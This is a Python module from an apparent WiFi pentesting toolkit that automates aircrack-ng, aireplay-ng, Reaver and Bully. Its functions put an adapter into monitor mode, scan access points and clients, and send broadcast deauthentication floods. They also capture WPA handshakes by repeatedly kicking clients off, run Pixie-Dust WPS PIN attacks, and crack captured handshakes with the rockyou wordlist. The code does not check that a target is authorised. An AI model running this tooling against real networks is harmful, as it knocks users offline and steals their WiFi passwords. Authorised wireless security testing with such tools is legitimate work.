"""WiFi pentesting module — deauth, handshake capture, WPS attacks, cracking."""

import asyncio
import logging
import os
import re
import signal
from datetime import datetime
from pathlib import Path

logger = logging.getLogger("penstation.wifi_attack")

CAPTURE_DIR = Path("/home/kali/penstation/captures")
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

# Track running attack processes
_running_attacks: dict[str, asyncio.subprocess.Process] = {}


# ── Monitor Mode Management ──────────────────────────────

async def start_monitor(interface: str) -> str | None:
    """Put interface into monitor mode. Returns monitor interface name."""
    try:
        # Kill interfering processes
        proc = await asyncio.create_subprocess_exec(
            "airmon-ng", "check", "kill",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await proc.communicate()

        # Start monitor mode
        proc = await asyncio.create_subprocess_exec(
            "airmon-ng", "start", interface,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        output = stdout.decode() + stderr.decode()

        # Find the monitor interface name
        for pattern in [
            r"monitor mode.*enabled.*on.*\[?(\w+mon)\]?",
            r"\((\w+mon)\)",
            r"(\w+mon)",
        ]:
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                mon_iface = match.group(1)
                logger.info(f"Monitor mode enabled: {mon_iface}")
                return mon_iface

        # Fallback: check if interface + "mon" exists
        mon_iface = interface + "mon"
        check = await asyncio.create_subprocess_exec(
            "iw", "dev",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await check.communicate()
        if mon_iface in stdout.decode():
            logger.info(f"Monitor mode enabled: {mon_iface}")
            return mon_iface

        logger.error(f"Failed to enable monitor mode: {output}")
        return None
    except Exception as e:
        logger.error(f"Monitor mode error: {e}")
        return None


async def stop_monitor(mon_interface: str) -> bool:
    """Stop monitor mode and restart NetworkManager."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "airmon-ng", "stop", mon_interface,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await proc.communicate()

        # Restart NetworkManager
        await asyncio.create_subprocess_exec(
            "systemctl", "start", "NetworkManager",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        logger.info(f"Monitor mode stopped on {mon_interface}")
        return True
    except Exception as e:
        logger.error(f"Stop monitor error: {e}")
        return False


# ── Airodump Scanning (detailed WiFi recon) ──────────────

async def airodump_scan(interface: str, duration: int = 30, channel: int = 0) -> dict:
    """
    Run airodump-ng scan to find APs and clients.

    Returns dict with 'networks' and 'clients' lists.
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_prefix = str(CAPTURE_DIR / f"scan_{timestamp}")

    cmd = ["airodump-ng", "--write", output_prefix, "--output-format", "csv", "-a"]
    if channel > 0:
        cmd.extend(["--channel", str(channel)])
    cmd.append(interface)

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _running_attacks["airodump"] = proc

        # Let it run for specified duration
        try:
            await asyncio.wait_for(proc.communicate(), timeout=duration)
        except asyncio.TimeoutError:
            proc.terminate()
            await asyncio.sleep(1)
            try:
                proc.kill()
            except ProcessLookupError:
                pass

        _running_attacks.pop("airodump", None)

        # Parse CSV output
        csv_file = output_prefix + "-01.csv"
        return _parse_airodump_csv(csv_file)

    except Exception as e:
        logger.error(f"Airodump scan error: {e}")
        _running_attacks.pop("airodump", None)
        return {"networks": [], "clients": []}


def _parse_airodump_csv(csv_path: str) -> dict:
    """Parse airodump-ng CSV output into structured data."""
    networks = []
    clients = []

    try:
        with open(csv_path, "r", errors="ignore") as f:
            content = f.read()
    except FileNotFoundError:
        logger.warning(f"CSV file not found: {csv_path}")
        return {"networks": [], "clients": []}

    # Split into AP section and client section
    sections = content.split("Station MAC")

    # Parse APs
    if sections:
        lines = sections[0].strip().split("\n")
        for line in lines[2:]:  # Skip headers
            fields = [f.strip() for f in line.split(",")]
            if len(fields) >= 14:
                try:
                    bssid = fields[0]
                    if not re.match(r"[0-9A-Fa-f:]{17}", bssid):
                        continue
                    networks.append({
                        "bssid": bssid,
                        "channel": int(fields[3]) if fields[3].strip() else 0,
                        "speed": fields[4].strip(),
                        "encryption": fields[5].strip(),
                        "cipher": fields[6].strip(),
                        "auth": fields[7].strip(),
                        "power": int(fields[8]) if fields[8].strip().lstrip("-").isdigit() else 0,
                        "beacons": int(fields[9]) if fields[9].strip().isdigit() else 0,
                        "data_packets": int(fields[10]) if fields[10].strip().isdigit() else 0,
                        "ssid": fields[13].strip(),
                        "wps": "WPS" in fields[5] if len(fields) > 5 else False,
                    })
                except (ValueError, IndexError):
                    continue

    # Parse clients
    if len(sections) > 1:
        lines = sections[1].strip().split("\n")
        for line in lines[1:]:  # Skip header
            fields = [f.strip() for f in line.split(",")]
            if len(fields) >= 6:
                try:
                    mac = fields[0]
                    if not re.match(r"[0-9A-Fa-f:]{17}", mac):
                        continue
                    clients.append({
                        "mac": mac,
                        "power": int(fields[3]) if fields[3].strip().lstrip("-").isdigit() else 0,
                        "packets": int(fields[4]) if fields[4].strip().isdigit() else 0,
                        "bssid": fields[5].strip() if len(fields) > 5 else "",
                        "probes": fields[6].strip() if len(fields) > 6 else "",
                    })
                except (ValueError, IndexError):
                    continue

    logger.info(f"Parsed {len(networks)} networks, {len(clients)} clients")
    return {"networks": networks, "clients": clients}


# ── Deauth Attack ─────────────────────────────────────────

async def deauth_attack(
    interface: str,
    target_bssid: str,
    client_mac: str = "FF:FF:FF:FF:FF:FF",
    count: int = 10,
) -> dict:
    """
    Send deauth packets to disconnect client(s) from AP.

    Args:
        interface: Monitor mode interface (e.g. wlan1mon)
        target_bssid: Target AP BSSID
        client_mac: Target client MAC (FF:FF:FF:FF:FF:FF = all clients)
        count: Number of deauth packets (0 = infinite)
    """
    attack_id = f"deauth_{target_bssid}"

    # Stop any existing attack on same target
    await stop_attack(attack_id)

    cmd = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", target_bssid,
    ]
    if client_mac and client_mac != "FF:FF:FF:FF:FF:FF":
        cmd.extend(["-c", client_mac])
    cmd.append(interface)

    try:
        logger.info(f"Deauth attack: {target_bssid} client={client_mac} count={count}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _running_attacks[attack_id] = proc

        stdout, stderr = await proc.communicate()
        output = stdout.decode() + stderr.decode()

        _running_attacks.pop(attack_id, None)

        # Count sent packets
        sent_match = re.search(r"(\d+)\s+(?:packets|ACKs)", output)
        packets_sent = int(sent_match.group(1)) if sent_match else count

        return {
            "success": proc.returncode == 0,
            "attack_type": "deauth",
            "target_bssid": target_bssid,
            "client_mac": client_mac,
            "packets_sent": packets_sent,
            "output": output[-500:],  # Last 500 chars
        }
    except Exception as e:
        _running_attacks.pop(attack_id, None)
        logger.error(f"Deauth error: {e}")
        return {"success": False, "error": str(e)}


# ── WPA Handshake Capture ─────────────────────────────────

async def capture_handshake(
    interface: str,
    target_bssid: str,
    channel: int,
    timeout: int = 60,
    deauth: bool = True,
) -> dict:
    """
    Capture WPA handshake by sniffing + optional deauth.

    Args:
        interface: Monitor mode interface
        target_bssid: Target AP BSSID
        channel: AP channel
        timeout: Max seconds to wait for handshake
        deauth: Send deauth to speed up capture
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    bssid_clean = target_bssid.replace(":", "")
    output_prefix = str(CAPTURE_DIR / f"hs_{bssid_clean}_{timestamp}")

    # Start airodump on specific channel/bssid
    airodump_cmd = [
        "airodump-ng",
        "--bssid", target_bssid,
        "--channel", str(channel),
        "--write", output_prefix,
        "--output-format", "pcap,csv",
        interface,
    ]

    try:
        logger.info(f"Capturing handshake for {target_bssid} ch={channel}")
        airodump_proc = await asyncio.create_subprocess_exec(
            *airodump_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _running_attacks["handshake_capture"] = airodump_proc

        # Wait a bit for airodump to start
        await asyncio.sleep(5)

        # Send deauth to force reconnection
        if deauth:
            deauth_task = asyncio.create_task(
                deauth_attack(interface, target_bssid, count=5)
            )

        # Wait for handshake or timeout
        pcap_file = output_prefix + "-01.cap"
        handshake_found = False
        start_time = asyncio.get_event_loop().time()

        while (asyncio.get_event_loop().time() - start_time) < timeout:
            await asyncio.sleep(5)

            # Check if handshake captured using aircrack-ng
            if Path(pcap_file).exists():
                check_proc = await asyncio.create_subprocess_exec(
                    "aircrack-ng", "-a2", "-w", "/dev/null", pcap_file,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                check_out, _ = await check_proc.communicate()
                check_output = check_out.decode()

                if "1 handshake" in check_output or "Passphrase not in" in check_output:
                    handshake_found = True
                    logger.info(f"Handshake captured for {target_bssid}!")
                    break

            # Send more deauth if needed
            if deauth and (asyncio.get_event_loop().time() - start_time) > 20:
                asyncio.create_task(
                    deauth_attack(interface, target_bssid, count=3)
                )

        # Stop airodump
        airodump_proc.terminate()
        try:
            await asyncio.wait_for(airodump_proc.communicate(), timeout=5)
        except asyncio.TimeoutError:
            airodump_proc.kill()

        _running_attacks.pop("handshake_capture", None)

        return {
            "success": handshake_found,
            "bssid": target_bssid,
            "pcap_path": pcap_file if handshake_found else None,
            "message": "Handshake captured!" if handshake_found else "No handshake captured within timeout",
        }

    except Exception as e:
        _running_attacks.pop("handshake_capture", None)
        logger.error(f"Handshake capture error: {e}")
        return {"success": False, "error": str(e)}


# ── WPS Attack (Reaver / Bully) ──────────────────────────

async def wps_attack(
    interface: str,
    target_bssid: str,
    channel: int,
    method: str = "reaver",
    pixie_dust: bool = True,
    timeout: int = 120,
) -> dict:
    """
    Attack WPS-enabled AP using Reaver or Bully.

    Pixie-Dust is much faster (seconds) but doesn't work on all routers.
    """
    attack_id = f"wps_{target_bssid}"

    if method == "reaver":
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target_bssid,
            "-c", str(channel),
            "-vv",
        ]
        if pixie_dust:
            cmd.append("-K")  # Pixie-Dust attack
    else:
        cmd = [
            "bully",
            "-b", target_bssid,
            "-c", str(channel),
            "-v", "3",
            interface,
        ]
        if pixie_dust:
            cmd.extend(["-d", "-f"])

    try:
        logger.info(f"WPS attack ({method}): {target_bssid} pixie={pixie_dust}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _running_attacks[attack_id] = proc

        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
        except asyncio.TimeoutError:
            proc.terminate()
            await asyncio.sleep(2)
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            _running_attacks.pop(attack_id, None)
            return {"success": False, "message": "WPS attack timed out"}

        _running_attacks.pop(attack_id, None)
        output = stdout.decode() + stderr.decode()

        # Parse results
        pin_match = re.search(r"WPS PIN:\s*'?(\d{8})'?", output)
        pass_match = re.search(r"WPA PSK:\s*'([^']+)'", output)
        if not pass_match:
            pass_match = re.search(r"Passphrase:\s*(.+)", output)

        pin = pin_match.group(1) if pin_match else None
        password = pass_match.group(1).strip() if pass_match else None

        return {
            "success": bool(pin or password),
            "bssid": target_bssid,
            "wps_pin": pin,
            "password": password,
            "method": method,
            "pixie_dust": pixie_dust,
            "output": output[-500:],
        }

    except Exception as e:
        _running_attacks.pop(attack_id, None)
        logger.error(f"WPS attack error: {e}")
        return {"success": False, "error": str(e)}


# ── Crack Handshake ───────────────────────────────────────

async def crack_handshake(
    pcap_path: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
) -> dict:
    """
    Crack WPA handshake using aircrack-ng with wordlist.
    """
    if not Path(pcap_path).exists():
        return {"success": False, "error": f"File not found: {pcap_path}"}

    # Check if rockyou.txt needs to be extracted
    if wordlist == "/usr/share/wordlists/rockyou.txt" and not Path(wordlist).exists():
        gz_path = wordlist + ".gz"
        if Path(gz_path).exists():
            logger.info("Extracting rockyou.txt...")
            proc = await asyncio.create_subprocess_exec(
                "gunzip", "-k", gz_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.communicate()

    if not Path(wordlist).exists():
        return {"success": False, "error": f"Wordlist not found: {wordlist}"}

    try:
        logger.info(f"Cracking {pcap_path} with {wordlist}")
        proc = await asyncio.create_subprocess_exec(
            "aircrack-ng",
            "-a2",
            "-w", wordlist,
            pcap_path,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _running_attacks["crack"] = proc
        stdout, stderr = await proc.communicate()
        _running_attacks.pop("crack", None)

        output = stdout.decode()

        # Parse result
        key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
        if key_match:
            password = key_match.group(1)
            logger.info(f"Password found: {password}")
            return {
                "success": True,
                "password": password,
                "pcap_path": pcap_path,
            }

        return {
            "success": False,
            "message": "Password not found in wordlist",
            "pcap_path": pcap_path,
        }

    except Exception as e:
        _running_attacks.pop("crack", None)
        logger.error(f"Crack error: {e}")
        return {"success": False, "error": str(e)}


# ── Attack Management ─────────────────────────────────────

async def stop_attack(attack_id: str) -> bool:
    """Stop a running attack by ID."""
    proc = _running_attacks.get(attack_id)
    if proc and proc.returncode is None:
        proc.terminate()
        try:
            await asyncio.wait_for(proc.communicate(), timeout=5)
        except asyncio.TimeoutError:
            proc.kill()
        _running_attacks.pop(attack_id, None)
        logger.info(f"Stopped attack: {attack_id}")
        return True
    _running_attacks.pop(attack_id, None)
    return False


async def stop_all_attacks() -> int:
    """Stop all running attacks. Returns count stopped."""
    count = 0
    for attack_id in list(_running_attacks.keys()):
        if await stop_attack(attack_id):
            count += 1
    return count


def get_running_attacks() -> list[str]:
    """Get list of running attack IDs."""
    return [
        aid for aid, proc in _running_attacks.items()
        if proc.returncode is None
    ]


def get_captures() -> list[dict]:
    """List all capture files."""
    captures = []
    for f in sorted(CAPTURE_DIR.glob("*.cap"), reverse=True):
        captures.append({
            "filename": f.name,
            "path": str(f),
            "size": f.stat().st_size,
            "created": datetime.fromtimestamp(f.stat().st_ctime).isoformat(),
        })
    return captures
